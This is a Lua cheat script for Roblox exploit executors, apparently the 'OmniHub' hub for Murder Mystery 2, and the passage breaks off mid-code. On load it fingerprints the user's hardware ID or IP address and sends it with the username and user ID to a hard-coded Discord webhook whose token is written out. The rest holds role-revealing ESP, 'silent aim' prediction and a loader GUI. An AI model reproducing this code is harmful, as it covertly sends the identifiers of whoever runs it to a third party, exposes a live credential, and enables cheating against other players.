local http_request

-- Establish the appropriate HTTP request function based on execution environment
if syn then
   http_request = syn.request
elseif SENTINEL_V2 then
   http_request = function(tb)
       return {
           StatusCode = 200,
           Body = request(tb.Url, tb.Method, tb.Body or '')
       }
   end
elseif http and http.request then
   http_request = http.request
elseif request then
   http_request = request
elseif httpservice then
   http_request = httpservice.request
else
   -- Fallback for unsupported exploits
   http_request = function()
       return {StatusCode = 404, Body = "{}"}
   end
end

-- Discord webhook configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1332981779916918836/dTw4xZHg7nZda7IvtOXYHgnAFGIVmQ-NLWi15jQQ0gbsIXIrzeG3IuRt9sttkT_gW1Hh"

-- Comprehensive fingerprint extraction function
function get_hwid()
   -- Attempt to retrieve headers from HTTP request
   local success, response = pcall(function()
       return http_request({
           Url = 'https://httpbin.org/get',
           Method = 'GET'
       })
   end)
   
   if not success or not response or response.StatusCode ~= 200 then
       return "Failed to retrieve HWID: Request error", "Error"
   end
   
   -- Parse JSON response
   local success, decoded_body = pcall(function()
       return game:GetService('HttpService'):JSONDecode(response.Body)
   end)
   
   if not success or not decoded_body or not decoded_body.headers then
       return "Failed to decode response", "Error"
   end
   
   -- Comprehensive list of exploit-specific fingerprint headers
   local hwid_keys = {
       -- PC exploits
       ["Syn-Fingerprint"] = "Synapse X",
       ["Exploit-Guid"] = "Generic",
       ["Krnl-Hwid"] = "KRNL",
       ["Sw-Fingerprint"] = "Script-Ware",
       ["Delta-Fingerprint"] = "Delta",
       ["Fluxus-Fingerprint"] = "Fluxus",
       ["Codex-Fingerprint"] = "Codex",
       ["Wave-Fingerprint"] = "Electron",
       ["Solara-Fingerprint"] = "Solara",
       ["Xeno-Fingerprint"] = "Xeno",
       ["Illusion-Fingerprint"] = "Illusion",
       
       -- Mobile exploits
       ["Arceus-Hardware"] = "Arceus X",
       ["Hydrogen-Id"] = "Hydrogen",
       ["Oxygen-Hardware"] = "Oxygen U",
       ["Fluxus-Mobile-Id"] = "Fluxus Mobile",
       ["Delta-Mobile"] = "Delta Mobile",
       ["Electron-Mobile"] = "Electron Mobile"
   }
   
   -- Check for any matching fingerprint header
   for header, executor in pairs(hwid_keys) do
       if decoded_body.headers[header] then
           return decoded_body.headers[header], executor
       end
   end
   
   -- Fallback: Analyze User-Agent for executor identification
   local user_agent = decoded_body.headers["User-Agent"]
   if user_agent then
       -- Attempt to identify executor from User-Agent string
       local executor_patterns = {
           {"Electron", "Electron"},
           {"Arceus", "Arceus X"},
           {"Fluxus", "Fluxus"},
           {"Oxygen", "Oxygen U"},
           {"Hydrogen", "Hydrogen"},
           {"Delta", "Delta"},
           {"Krnl", "KRNL"},
           {"SynapseX", "Synapse X"}
       }
       
       for _, pattern in ipairs(executor_patterns) do
           if user_agent:match(pattern[1]) then
               return user_agent, pattern[2]
           end
       end
       
       return user_agent, "Unknown (UA)"
   end
   
   -- Last resort: IP identification
   if decoded_body.origin then
       return decoded_body.origin, "IP-Address"
   end
   
   return "Unidentified client", "Unknown"
end

-- Send HWID to Discord webhook
function send_to_webhook(hwid, executor, player_info)
   -- Ensure the webhook URL is set
   if not WEBHOOK_URL or WEBHOOK_URL:match("your_webhook") then
       warn("Webhook URL not configured properly")
       return false
   end
   
   -- Format the data for Discord embedding
   local payload = {
       embeds = {
           {
               title = "HWID Captured",
               color = 0x2F3136,
               fields = {
                   {name = "Executor", value = executor or "Unknown", inline = true},
                   {name = "Username", value = player_info.Username or "Unknown", inline = true},
                   {name = "User ID", value = player_info.UserId or "Unknown", inline = true},
                   {name = "Hardware ID", value = "```" .. (hwid or "Failed to retrieve") .. "```", inline = false},
                   {name = "Game ID", value = game.PlaceId, inline = true},
                   {name = "Game Name", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = true}
               },
               footer = {
                   text = "Captured at " .. os.date("%Y-%m-%d %H:%M:%S")
               }
           }
       }
   }
   
   -- Convert to JSON string
   local json_payload = game:GetService("HttpService"):JSONEncode(payload)
   
   -- Send to webhook
   local success, response = pcall(function()
       return http_request({
           Url = WEBHOOK_URL,
           Method = "POST",
           Headers = {
               ["Content-Type"] = "application/json"
           },
           Body = json_payload
       })
   end)
   
   return success and response and response.StatusCode == 204
end

-- Main execution flow
local function main()
   -- Collect player information
   local player_info = {
       Username = game:GetService("Players").LocalPlayer.Name,
       UserId = game:GetService("Players").LocalPlayer.UserId,
       AccountAge = game:GetService("Players").LocalPlayer.AccountAge
   }
   
   -- Get HWID from client
   local hwid, executor = get_hwid()
   
   -- Log HWID to console for debugging
   print("Hardware ID:", hwid)
   print("Executor detected:", executor)
   
   -- Send HWID to Discord webhook
   local webhook_success = send_to_webhook(hwid, executor, player_info)
   
   if webhook_success then
       print("Successfully Get HWID")
   else
       warn("Failed")
   end
end

-- Initialize the fingerprint capture process
main()

-- Store function globally for external access
_G.get_hwid = get_hwid


-- Ultra-Optimized Character Outline ESP for MM2
-- Core Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Game-specific state tracking
local roles = {}
local Murder, Sheriff, Hero = nil, nil, nil
local GunDrop = nil

-- ESP Configuration
local ESP = {
   Enabled = true,
   OutlineThickness = 3,
   MaxRenderDistance = 175,
   Colors = {
       Murderer = Color3.fromRGB(255, 0, 0),
       Sheriff = Color3.fromRGB(0, 100, 255),
       Hero = Color3.fromRGB(255, 215, 0),
       Innocent = Color3.fromRGB(50, 255, 100),
       GunDrop = Color3.fromRGB(255, 255, 50)
   }
}

-- FIX: Use proper container instance for client-side rendering
local HighlightFolder = Instance.new("Folder")
HighlightFolder.Name = "ESP_Highlights"
-- Use proper parent for client-side UI elements
if syn and syn.protect_gui then
    syn.protect_gui(HighlightFolder)
    HighlightFolder.Parent = game:GetService("CoreGui")
else
    HighlightFolder.Parent = CoreGui
end

-- Highlight object container with strict typing
local Highlights = {}

-- Game mechanics functions
function IsAlive(Player)
   for i, v in pairs(roles) do
       if Player.Name == i then
           return not (v.Killed or v.Dead)
       end
   end
   return false
end

-- FIX: Reliable role tracking with connection management
local RoleUpdateConnection = nil
local function SetupRoleTracking()
    -- Clear previous connection if it exists
    if RoleUpdateConnection then
        RoleUpdateConnection:Disconnect()
        RoleUpdateConnection = nil
    end
    
    -- Create new connection with proper error handling
    RoleUpdateConnection = RunService.Heartbeat:Connect(function()
        pcall(function()
            if ReplicatedStorage:FindFirstChild("GetPlayerData", true) then
                roles = ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
                for i, v in pairs(roles) do
                    if v.Role == "Murderer" then Murder = i
                    elseif v.Role == "Sheriff" then Sheriff = i
                    elseif v.Role == "Hero" then Hero = i end
                end
            end
        end)
    end)
end

-- FIX: Reliable gun tracking
local GunTrackingConnections = {}
local function SetupGunTracking()
    -- Clear previous connections
    for _, conn in pairs(GunTrackingConnections) do
        conn:Disconnect()
    end
    table.clear(GunTrackingConnections)
    
    -- Check for existing gun drop
    for _, item in pairs(workspace:GetChildren()) do
        if item.Name == "GunDrop" then
            GunDrop = item
            break
        end
    end
    
    -- Setup new connections
    GunTrackingConnections[1] = workspace.ChildAdded:Connect(function(child)
        if child.Name == "GunDrop" then GunDrop = child end
    end)
    
    GunTrackingConnections[2] = workspace.ChildRemoved:Connect(function(child)
        if child == GunDrop then GunDrop = nil end
    end)
end

-- Get role color mapping
local function GetPlayerColor(playerName)
   if playerName == Murder then return ESP.Colors.Murderer
   elseif playerName == Sheriff then return ESP.Colors.Sheriff
   elseif playerName == Hero then return ESP.Colors.Hero
   else return ESP.Colors.Innocent end
end

-- FIX: Create optimized character outline with proper error handling
local function CreateOutline(player)
   if not player or not player.Parent then return nil end
   if Highlights[player] then return Highlights[player] end
   
   local highlight = Instance.new("Highlight")
   highlight.Name = player.Name
   highlight.FillTransparency = 0.85
   highlight.FillColor = GetPlayerColor(player.Name)
   highlight.OutlineColor = GetPlayerColor(player.Name)
   highlight.OutlineTransparency = 0
   highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
   highlight.Enabled = ESP.Enabled
   highlight.Parent = HighlightFolder
   
   -- Apply pulsing effect to murderer for improved visibility
   if player.Name == Murder then
       local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
       local tween = TweenService:Create(highlight, tweenInfo, {OutlineTransparency = 0.4})
       tween:Play()
   end
   
   Highlights[player] = highlight
   return highlight
end

-- FIX: Reliable outline removal with proper cleanup
local function RemoveOutline(player)
   local highlight = Highlights[player]
   if highlight then
       highlight:Destroy()
       Highlights[player] = nil
   end
end

-- FIX: Enhanced ESP update function with proper validation
local function UpdateESP()
   -- Update highlights based on ESP.Enabled state
   for player, highlight in pairs(Highlights) do
       if type(player) == "table" and player:IsA("Player") then
           highlight.Enabled = ESP.Enabled
       end
   end
   
   -- Exit early if disabled
   if not ESP.Enabled then return end
   
   -- Update ESP for each player
   for _, player in ipairs(Players:GetPlayers()) do
       if player == LocalPlayer then continue end
       
       local character = player.Character
       if not character or not character:FindFirstChild("HumanoidRootPart") or not IsAlive(player) then
           if Highlights[player] then
               Highlights[player].Enabled = false
           end
           continue
       end
       
       -- Distance check for optimization
       local rootPart = character:FindFirstChild("HumanoidRootPart")
       local distance = (rootPart.Position - Camera.CFrame.Position).Magnitude
       
       if distance > ESP.MaxRenderDistance then
           if Highlights[player] then
               Highlights[player].Enabled = false
           end
           continue
       end
       
       -- Create or update outline
       local highlight = CreateOutline(player)
       if highlight then
           highlight.Adornee = character
           highlight.FillColor = GetPlayerColor(player.Name)
           highlight.OutlineColor = GetPlayerColor(player.Name)
           highlight.Enabled = true
       end
   end
   
   -- Gun Drop ESP handling
   if GunDrop and GunDrop.Parent then
       if not Highlights.GunDrop then
           local highlight = Instance.new("Highlight")
           highlight.Name = "GunDrop"
           highlight.FillTransparency = 0.5
           highlight.FillColor = ESP.Colors.GunDrop
           highlight.OutlineColor = ESP.Colors.GunDrop
           highlight.OutlineTransparency = 0
           highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
           highlight.Enabled = ESP.Enabled
           highlight.Parent = HighlightFolder
           
           Highlights.GunDrop = highlight
       end
       Highlights.GunDrop.Adornee = GunDrop
   elseif Highlights.GunDrop then
       Highlights.GunDrop:Destroy()
       Highlights.GunDrop = nil
   end
end

-- FIX: Enhanced player joining/leaving handlers
local PlayerAddedConnection = nil
local PlayerRemovingConnection = nil

local function SetupPlayerConnections()
    -- Clear previous connections
    if PlayerAddedConnection then PlayerAddedConnection:Disconnect() end
    if PlayerRemovingConnection then PlayerRemovingConnection:Disconnect() end
    
    -- Setup new connections
    PlayerAddedConnection = Players.PlayerAdded:Connect(function(player)
        -- Force update highlights on player join
        task.delay(1, function()
            if not player or not player.Parent then return end
            if player.Character then
                UpdateESP()
            end
            
            player.CharacterAdded:Connect(function()
                task.delay(0.5, UpdateESP) -- Update after character loads
            end)
        end)
    end)
    
    PlayerRemovingConnection = Players.PlayerRemoving:Connect(function(player)
        RemoveOutline(player)
    end)
    
    -- Setup character connections for existing players
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            player.CharacterAdded:Connect(function()
                task.delay(0.5, UpdateESP) -- Update after character loads
            end)
        end
    end
end

-- FIX: ESP Toggle function with proper state management
local function ToggleESP(state)
    ESP.Enabled = state
    
    -- Update all existing highlights
    for player, highlight in pairs(Highlights) do
        highlight.Enabled = state
    end
    
    -- Force immediate update
    if state then
        UpdateESP()
    end
end


local function GetMurderer()
   for _, player in pairs(game.Players:GetPlayers()) do
       if player.Character and player.Character:FindFirstChild("Knife") then
           return player
       end
   end
   return nil
end


---Silent Aim
local function predictMurderV3(murderer, algorithmType)
   local character = murderer.Character
   if not character then return nil end
   local rootPart = character:FindFirstChild("HumanoidRootPart")
   local humanoid = character:FindFirstChild("Humanoid")
   if not rootPart or not humanoid then return nil end

   -- Enhanced constants for more accurate prediction
   local Interval = 0.05 -- Smaller interval for more precise simulation
   local Gravity = 196.2 -- Standard Roblox gravity
   local WalkSpeed = humanoid.WalkSpeed -- Use actual walk speed
   local JumpPower = humanoid.JumpPower
   local MaxPredictionTime = 0.6 -- Slightly longer prediction window
   local MaxVerticalOffset = 5
   
   -- Advanced physics constants
   local AirDrag = 0.25 -- Air resistance coefficient
   local GroundFriction = 14 -- Ground friction coefficient
   local AccelerationFactor = 20 -- How quickly players reach max speed
   local JumpPredictionAccuracy = 0.9 -- Jump prediction multiplier
   local MovementPredictionWeight = 0.85 -- Weight for movement direction prediction
   
   -- Get initial state
   local CurrentPosition = rootPart.Position
   local CurrentVelocity = rootPart.AssemblyLinearVelocity
   local MoveDirection = humanoid.MoveDirection.Unit
   local IsJumping = humanoid.Jump
   local IsOnGround = humanoid:GetState() ~= Enum.HumanoidStateType.Freefall
   
   -- Movement history for pattern recognition (simple version)
   local lastKnownPositions = {}
   local positionSampleCount = 3
   
   -- Function to calculate acceleration based on current state
   local function calculateAcceleration()
       local targetVelocity = MoveDirection * WalkSpeed
       local currentHorizontalVel = Vector3.new(CurrentVelocity.X, 0, CurrentVelocity.Z)
       local acceleration = Vector3.new(0, 0, 0)
       
       -- Apply acceleration toward target velocity
       if IsOnGround then
           local speedDiff = targetVelocity - currentHorizontalVel
           acceleration = speedDiff.Unit * math.min(AccelerationFactor, speedDiff.Magnitude)
           
           -- Apply friction when slowing down
           if currentHorizontalVel.Magnitude > 0.1 and MoveDirection.Magnitude < 0.1 then
               local frictionDir = -currentHorizontalVel.Unit
               acceleration = acceleration + frictionDir * GroundFriction
           end
       else
           -- Less control in air
           local speedDiff = targetVelocity - currentHorizontalVel
           acceleration = speedDiff.Unit * math.min(AccelerationFactor * 0.2, speedDiff.Magnitude)
       end
       
       -- Apply gravity
       acceleration = acceleration + Vector3.new(0, -Gravity, 0)
       
       return acceleration
   end
   
   -- Function to predict jump trajectory more accurately
   local function predictJump()
       if not IsJumping or not IsOnGround then return Vector3.new(0, 0, 0) end
       
       local jumpVelocity = Vector3.new(0, JumpPower * JumpPredictionAccuracy, 0)
       
       -- Add horizontal momentum to jump
       if MoveDirection.Magnitude > 0.1 then
           jumpVelocity = jumpVelocity + MoveDirection * WalkSpeed * 0.5
       end
       
       return jumpVelocity
   end
   
   -- Function to analyze movement patterns (simple version)
   local function analyzeMovementPattern()
       if #lastKnownPositions < positionSampleCount then
           return MoveDirection
       end
       
       local predictedDirection = Vector3.new(0, 0, 0)
       for i = 1, #lastKnownPositions - 1 do
           local movement = lastKnownPositions[i+1] - lastKnownPositions[i]
           movement = Vector3.new(movement.X, 0, movement.Z).Unit
           predictedDirection = predictedDirection + movement
       end
       
       if predictedDirection.Magnitude > 0.1 then
           return predictedDirection.Unit
       else
           return MoveDirection
       end
   end
   
   -- Initialize simulation variables
   local SimulatedPosition = CurrentPosition
   local SimulatedVelocity = CurrentVelocity
   
   -- Apply algorithm-specific adjustments
   if algorithmType == "Algorithm" then
       -- Precise physics-based prediction
       local totalTime = 0
       
       -- Apply initial jump if applicable
       if IsJumping and IsOnGround then
           SimulatedVelocity = SimulatedVelocity + predictJump()
           IsOnGround = false
       end
       
       -- Predict movement pattern
       local predictedMoveDirection = analyzeMovementPattern()
       MoveDirection = MoveDirection:Lerp(predictedMoveDirection, MovementPredictionWeight)
       
       -- Run simulation steps
       while totalTime < MaxPredictionTime do
           -- Calculate acceleration for this step
           local acceleration = calculateAcceleration()
           
           -- Apply velocity changes
           SimulatedVelocity = SimulatedVelocity + acceleration * Interval
           
           -- Apply air drag
           if not IsOnGround then
               SimulatedVelocity = SimulatedVelocity * (1 - AirDrag * Interval)
           end
           
           -- Update position
           SimulatedPosition = SimulatedPosition + SimulatedVelocity * Interval
           
           -- Check for ground collision
           local rayParams = RaycastParams.new()
           rayParams.FilterType = Enum.RaycastFilterType.Blacklist
           rayParams.FilterDescendantsInstances = {character}
           
           local floorRay = workspace:Raycast(SimulatedPosition, Vector3.new(0, -3, 0), rayParams)
           if floorRay and (SimulatedPosition.Y - floorRay.Position.Y) < 3 then
               SimulatedPosition = Vector3.new(SimulatedPosition.X, floorRay.Position.Y + 3, SimulatedPosition.Z)
               SimulatedVelocity = Vector3.new(SimulatedVelocity.X, 0, SimulatedVelocity.Z)
               IsOnGround = true
           end
           
           -- Update time
           totalTime = totalTime + Interval
           
           -- Store position for next iteration
           table.insert(lastKnownPositions, SimulatedPosition)
           if #lastKnownPositions > positionSampleCount then
               table.remove(lastKnownPositions, 1)
           end
       end
       
   elseif algorithmType == "Jet" then
       -- More aggressive prediction for fast-moving targets
       local JetFactor = 3.2 -- Higher multiplier for faster movement
       local JetAccelerationBoost = 1.5 -- Faster acceleration
       local JetAirControl = 0.4 -- Better air control
       
       -- Apply initial jump boost if applicable
       if IsJumping and IsOnGround then
           SimulatedVelocity = SimulatedVelocity + predictJump() * 1.2 -- 20% higher jumps
           IsOnGround = false
       end
       
       local totalTime = 0
       
       -- Enhanced predictive movement pattern analysis for Jet mode
       local predictedMoveDirection = analyzeMovementPattern()
       MoveDirection = MoveDirection:Lerp(predictedMoveDirection, MovementPredictionWeight * 1.2)
       
       -- Run simulation with jet parameters
       while totalTime < MaxPredictionTime * 1.2 do -- 20% longer prediction time
           -- Calculate acceleration with jet boost
           local targetVelocity = MoveDirection * WalkSpeed * JetFactor
           local currentHorizontalVel = Vector3.new(SimulatedVelocity.X, 0, SimulatedVelocity.Z)
           local acceleration = Vector3.new(0, 0, 0)
           
           if IsOnGround then
               local speedDiff = targetVelocity - currentHorizontalVel
               acceleration = speedDiff.Unit * math.min(AccelerationFactor * JetAccelerationBoost, speedDiff.Magnitude)
           else
               -- Better air control in Jet mode
               local speedDiff = targetVelocity - currentHorizontalVel
               acceleration = speedDiff.Unit * math.min(AccelerationFactor * JetAirControl, speedDiff.Magnitude)
           end
           
           -- Apply gravity with slight reduction for jet mode
           acceleration = acceleration + Vector3.new(0, -Gravity * 0.9, 0)
           
           -- Apply velocity changes
           SimulatedVelocity = SimulatedVelocity + acceleration * Interval
           
           -- Apply reduced air drag for Jet mode
           SimulatedVelocity = SimulatedVelocity * (1 - (AirDrag * 0.7) * Interval)
           
           -- Update position
           SimulatedPosition = SimulatedPosition + SimulatedVelocity * Interval
           
           -- Check for ground collision
           local rayParams = RaycastParams.new()
           rayParams.FilterType = Enum.RaycastFilterType.Blacklist
           rayParams.FilterDescendantsInstances = {character}
           
           local floorRay = workspace:Raycast(SimulatedPosition, Vector3.new(0, -4, 0), rayParams)
           if floorRay and (SimulatedPosition.Y - floorRay.Position.Y) < 4 then
               SimulatedPosition = Vector3.new(SimulatedPosition.X, floorRay.Position.Y + 4, SimulatedPosition.Z)
               SimulatedVelocity = Vector3.new(SimulatedVelocity.X, 0, SimulatedVelocity.Z)
               IsOnGround = true
           end
           
           -- Update time
           totalTime = totalTime + Interval
       end
   elseif algorithmType == "Adaptive" then
       -- New adaptive algorithm that adjusts based on target's movement patterns
       local adaptivePhysicsMultiplier = 1.0
       local patternPredictionWeight = 0.9
       local adaptiveMaxTime = MaxPredictionTime
       
       -- Analyze recent movements to determine prediction strategy
       local velocityMagnitude = CurrentVelocity.Magnitude
       
       -- Adjust prediction parameters based on target velocity
       if velocityMagnitude > 40 then
           -- Fast moving target needs more aggressive prediction
           adaptivePhysicsMultiplier = 1.8
           adaptiveMaxTime = MaxPredictionTime * 1.3
           patternPredictionWeight = 0.95
       elseif velocityMagnitude > 20 then
           -- Medium speed target
           adaptivePhysicsMultiplier = 1.4
           adaptiveMaxTime = MaxPredictionTime * 1.1
           patternPredictionWeight = 0.9
       else
           -- Slow or stationary target
           adaptivePhysicsMultiplier = 1.0
           adaptiveMaxTime = MaxPredictionTime
           patternPredictionWeight = 0.8
       end
       
       -- Apply jump prediction if needed
       if IsJumping and IsOnGround then
           local jumpVel = predictJump()
           SimulatedVelocity = SimulatedVelocity + jumpVel * adaptivePhysicsMultiplier
           IsOnGround = false
       end
       
       -- Predict movement pattern with adaptive weight
       local predictedMoveDirection = analyzeMovementPattern()
       MoveDirection = MoveDirection:Lerp(predictedMoveDirection, patternPredictionWeight)
       
       -- Simulate movement with adaptive parameters
       local totalTime = 0
       
       while totalTime < adaptiveMaxTime do
           -- Calculate acceleration with adaptive multiplier
           local targetVelocity = MoveDirection * WalkSpeed * adaptivePhysicsMultiplier
           local currentHorizontalVel = Vector3.new(SimulatedVelocity.X, 0, SimulatedVelocity.Z)
           local acceleration = Vector3.new(0, 0, 0)
           
           if IsOnGround then
               local speedDiff = targetVelocity - currentHorizontalVel
               acceleration = speedDiff.Unit * math.min(AccelerationFactor * adaptivePhysicsMultiplier, speedDiff.Magnitude)
               
               -- Adaptive friction
               if currentHorizontalVel.Magnitude > 0.1 and MoveDirection.Magnitude < 0.1 then
                   local frictionDir = -currentHorizontalVel.Unit
                   acceleration = acceleration + frictionDir * GroundFriction * adaptivePhysicsMultiplier
               end
           else
               -- Adaptive air control
               local speedDiff = targetVelocity - currentHorizontalVel
               acceleration = speedDiff.Unit * math.min(AccelerationFactor * 0.3 * adaptivePhysicsMultiplier, speedDiff.Magnitude)
           end
           
           -- Apply adaptive gravity
           acceleration = acceleration + Vector3.new(0, -Gravity * (0.95 + (0.05 * adaptivePhysicsMultiplier)), 0)
           
           -- Update velocity with acceleration
           SimulatedVelocity = SimulatedVelocity + acceleration * Interval
           
           -- Apply adaptive air resistance
           SimulatedVelocity = SimulatedVelocity * (1 - (AirDrag / adaptivePhysicsMultiplier) * Interval)
           
           -- Update position
           SimulatedPosition = SimulatedPosition + SimulatedVelocity * Interval
           
           -- Check for ground collision with adaptive offset
           local rayParams = RaycastParams.new()
           rayParams.FilterType = Enum.RaycastFilterType.Blacklist
           rayParams.FilterDescendantsInstances = {character}
           
           local groundOffset = 3 * adaptivePhysicsMultiplier
           local floorRay = workspace:Raycast(SimulatedPosition, Vector3.new(0, -groundOffset, 0), rayParams)
           if floorRay and (SimulatedPosition.Y - floorRay.Position.Y) < groundOffset then
               SimulatedPosition = Vector3.new(SimulatedPosition.X, floorRay.Position.Y + groundOffset, SimulatedPosition.Z)
               SimulatedVelocity = Vector3.new(SimulatedVelocity.X, 0, SimulatedVelocity.Z)
               IsOnGround = true
           end
           
           -- Update time
           totalTime = totalTime + Interval
           
           -- Store position for pattern analysis
           table.insert(lastKnownPositions, SimulatedPosition)
           if #lastKnownPositions > positionSampleCount then
               table.remove(lastKnownPositions, 1)
           end
       end
   end
   
   -- Apply final aim adjustment based on target's state
   local HeadOffset = Vector3.new(0, 1.5, 0) -- Target the head for better accuracy
   
   -- Adjust aim point based on target's movement speed
   local finalSpeed = SimulatedVelocity.Magnitude
   if finalSpeed > 40 then
       -- Add a small lead for very fast targets
       SimulatedPosition = SimulatedPosition + SimulatedVelocity.Unit * 0.8
   elseif finalSpeed > 20 then
       -- Add slight lead for medium speed targets
       SimulatedPosition = SimulatedPosition + SimulatedVelocity.Unit * 0.4
   end
   
   -- Apply collision avoidance to prevent shooting walls
   local rayToTarget = RaycastParams.new()
   rayToTarget.FilterType = Enum.RaycastFilterType.Blacklist
   rayToTarget.FilterDescendantsInstances = {game.Players.LocalPlayer.Character, character}
   
   local obstacleCheck = workspace:Raycast(CurrentPosition, (SimulatedPosition - CurrentPosition), rayToTarget)
   if obstacleCheck then
       -- If obstacle detected, try to aim slightly higher to avoid it
       SimulatedPosition = SimulatedPosition + Vector3.new(0, 1.0, 0)
   end
   
   return SimulatedPosition + HeadOffset
end

-- Silent Aim V3 GUI Button
local SilentAimGuiV3 = Instance.new("ScreenGui")
local SilentAimButtonV3 = Instance.new("ImageButton")

SilentAimGuiV3.Name = "SilentAimGuiV3"
SilentAimGuiV3.Parent = game.CoreGui

SilentAimButtonV3.Name = "SilentAimButtonV3"
SilentAimButtonV3.Parent = SilentAimGuiV3
SilentAimButtonV3.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
SilentAimButtonV3.BackgroundTransparency = 0.3
SilentAimButtonV3.BorderColor3 = Color3.fromRGB(255, 100, 0)
SilentAimButtonV3.BorderSizePixel = 2
SilentAimButtonV3.Position = UDim2.new(0.897, 0, 0.5, 0)
SilentAimButtonV3.Size = UDim2.new(0.1, 0, 0.2, 0)
SilentAimButtonV3.Image = "rbxassetid://11162755592"
SilentAimButtonV3.Draggable = true
SilentAimButtonV3.Visible = false

local UIStroke = Instance.new("UIStroke", SilentAimButtonV3)
UIStroke.Color = Color3.fromRGB(255, 100, 0)
UIStroke.Thickness = 2
UIStroke.Transparency = 0.5


-------------------------------------LOADER----------------------------------LOADER-------------------------

-- OmniHub Loader GUI Script with Water Transition Animation

local player = game.Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "OmniHubLoader"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Services
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

-- Create main container frame with rounded corners
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 450, 0, 250)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
mainFrame.BorderSizePixel = 0
mainFrame.BackgroundTransparency = 1
mainFrame.Parent = screenGui

-- Add UI corner to main frame
local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 12)
mainCorner.Parent = mainFrame

-- Add drop shadow
local dropShadow = Instance.new("ImageLabel")
dropShadow.Name = "DropShadow"
dropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
dropShadow.BackgroundTransparency = 1
dropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
dropShadow.Size = UDim2.new(1, 40, 1, 40)
dropShadow.ZIndex = 0
dropShadow.Image = "rbxassetid://6014261993"
dropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
dropShadow.ImageTransparency = 1
dropShadow.ScaleType = Enum.ScaleType.Slice
dropShadow.SliceCenter = Rect.new(49, 49, 450, 450)
dropShadow.Parent = mainFrame

-- Create water particles container with clip boundary
local waterContainer = Instance.new("Frame")
waterContainer.Name = "WaterContainer"
waterContainer.Size = UDim2.new(1, 0, 1, 0)
waterContainer.BackgroundTransparency = 1
waterContainer.ClipsDescendants = true
waterContainer.Parent = mainFrame

-- Create surface tension frame (the water "level" that forms)
local waterSurface = Instance.new("Frame")
waterSurface.Name = "WaterSurface"
waterSurface.Size = UDim2.new(1, 0, 0, 0)
waterSurface.Position = UDim2.new(0, 0, 1, 0)  -- Start at bottom
waterSurface.BackgroundColor3 = Color3.fromRGB(79, 149, 255)
waterSurface.BackgroundTransparency = 0.3
waterSurface.BorderSizePixel = 0
waterSurface.Visible = false
waterSurface.Parent = waterContainer

-- Create splashes container for extra particle effects
local splashesContainer = Instance.new("Frame")
splashesContainer.Name = "SplashesContainer"
splashesContainer.Size = UDim2.new(1, 0, 1, 0)
splashesContainer.BackgroundTransparency = 1
splashesContainer.ZIndex = 3
splashesContainer.Parent = mainFrame

-- Create logo
local logo = Instance.new("ImageLabel")
logo.Name = "Logo"
logo.Size = UDim2.new(0, 100, 0, 100)
logo.Position = UDim2.new(0.5, 0, 0.3, 0)
logo.AnchorPoint = Vector2.new(0.5, 0.5)
logo.BackgroundTransparency = 1
logo.Image = "rbxassetid://122380482857500" -- Replace with your logo asset ID
logo.ImageTransparency = 1
logo.ZIndex = 2
logo.Parent = mainFrame

-- Create title
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 50)
title.Position = UDim2.new(0, 0, 0.55, 0)
title.Font = Enum.Font.GothamBold
title.Text = "OMNIHUB"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 36
title.BackgroundTransparency = 1
title.TextTransparency = 1
title.ZIndex = 2
title.Parent = mainFrame

-- Create version text
local versionText = Instance.new("TextLabel")
versionText.Name = "Version"
versionText.Size = UDim2.new(1, 0, 0, 20)
versionText.Position = UDim2.new(0, 0, 0.67, 0)
versionText.Font = Enum.Font.Gotham
versionText.Text = "V1.1.5 • By Azzakirms"
versionText.TextColor3 = Color3.fromRGB(180, 180, 255)
versionText.TextSize = 14
versionText.BackgroundTransparency = 1
versionText.TextTransparency = 1
versionText.ZIndex = 2
versionText.Parent = mainFrame

-- Create loading status
local statusText = Instance.new("TextLabel")
statusText.Name = "Status"
statusText.Size = UDim2.new(0.8, 0, 0, 20)
statusText.Position = UDim2.new(0.1, 0, 0.78, 0)
statusText.Font = Enum.Font.Gotham
statusText.Text = "Initializing..."
statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
statusText.TextSize = 16
statusText.BackgroundTransparency = 1
statusText.TextTransparency = 1
statusText.ZIndex = 2
statusText.Parent = mainFrame

-- Create progress bar container
local progressContainer = Instance.new("Frame")
progressContainer.Name = "ProgressContainer"
progressContainer.Size = UDim2.new(0.8, 0, 0, 10)
progressContainer.Position = UDim2.new(0.1, 0, 0.85, 0)
progressContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
progressContainer.BorderSizePixel = 0
progressContainer.BackgroundTransparency = 1
progressContainer.ZIndex = 2
progressContainer.Parent = mainFrame

-- Add corner to progress container
local progressCorner = Instance.new("UICorner")
progressCorner.CornerRadius = UDim.new(0, 5)
progressCorner.Parent = progressContainer

-- Create progress bar fill
local progressFill = Instance.new("Frame")
progressFill.Name = "ProgressFill"
progressFill.Size = UDim2.new(0, 0, 1, 0)
